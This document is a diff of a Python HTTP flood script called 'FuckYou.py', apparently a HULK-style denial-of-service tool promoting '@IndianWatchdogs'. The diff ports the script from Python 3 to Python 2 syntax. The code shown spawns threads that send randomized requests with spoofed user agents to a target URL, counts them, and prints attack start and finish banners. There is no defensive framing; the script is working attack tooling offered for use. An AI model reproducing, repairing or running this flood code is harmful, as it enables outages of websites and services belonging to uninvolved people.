@@ -16,8 +16,7 @@
 
 # ----------------------------------------------------------------------------------------------
 
-import urllib.request
-import urllib.error
+import urllib2
 
 import sys
 
@@ -133,15 +132,15 @@ def buildblock(size):
 
 def usage():
 
-	print('---------------------------------------------------')
+	print '---------------------------------------------------'
 
-	print ('USAGE: python FuckYou.py <url>')
+	print 'USAGE: python FuckYou.py <url>'
 
-	print ('you can add "safe" after url, to autoshut after dos')
+	print 'you can add "safe" after url, to autoshut after dos'
 	
-	print ('Join @IndianWatchdogs')
+	print 'Join @IndianWatchdogs'
 
-	print ('---------------------------------------------------')
+	print '---------------------------------------------------'
 
 
 
@@ -163,7 +162,7 @@ def httpcall(url):
 
 		param_joiner="?"
 
-	request = urllib.request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
+	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
 
 	request.add_header('User-Agent', random.choice(headers_useragents))
 
@@ -181,19 +180,19 @@ def httpcall(url):
 
 	try:
 
-			urllib.urlopen(request)
+			urllib2.urlopen(request)
 
-	except urllib.HTTPError as e:
+	except urllib2.HTTPError, e:
 
 			#print e.code
 
 			set_flag(1)
 
-			print ('Response Code 500')
+			print 'Response Code 500'
 
 			code=500
 
-	except urllib.URLError as e:
+	except urllib2.URLError, e:
 
 			#print e.reason
 
@@ -203,7 +202,7 @@ def httpcall(url):
 
 			inc_counter()
 
-			urllib.urlopen(request)
+			urllib2.urlopen(request)
 
 	return(code)		
 
@@ -225,7 +224,7 @@ class HTTPThread(threading.Thread):
 
 					set_flag(2)
 
-		except Exception as ex:
+		except Exception, ex:
 
 			pass
 
@@ -240,15 +239,15 @@ class MonitorThread(threading.Thread):
 
 		while flag==0:
 
-			if (previous+100<request_counter) & (previous!=request_counter):
+			if (previous+100<request_counter) & (previous<>request_counter):
 
-				print ("%d Requests Sent" % (request_counter))
+				print "%d Requests Sent" % (request_counter)
 
 				previous=request_counter
 
 		if flag==2:
 
-			print ("\n-- FuckYou Attack Finished --")
+			print "\n-- FuckYou Attack Finished --"
 
 
 #execute 
@@ -269,7 +268,7 @@ else:
 
 	else:
 
-		print ("-- FuckYou Attack Started --")
+		print "-- FuckYou Attack Started --"
 
 		if len(sys.argv)== 3:
 
